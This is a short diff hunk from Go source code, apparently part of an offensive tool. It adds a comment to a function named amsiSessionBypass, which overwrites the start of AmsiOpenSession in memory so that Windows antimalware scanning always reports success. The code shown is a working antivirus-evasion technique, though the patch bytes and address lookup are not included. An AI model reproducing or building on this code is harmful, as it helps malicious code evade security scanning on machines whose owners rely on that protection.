@@ -39,6 +39,7 @@ func amsiSessionBypass() string {
 		return "AmsiOpenSession bypass: VirtualProtect failed"
 	}
 
+	// Patch AmsiOpenSession prologue: write XOR,INC;RET to return S_OK immediately
 	for i := 0; i < len(patch); i++ {
 		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
 	}
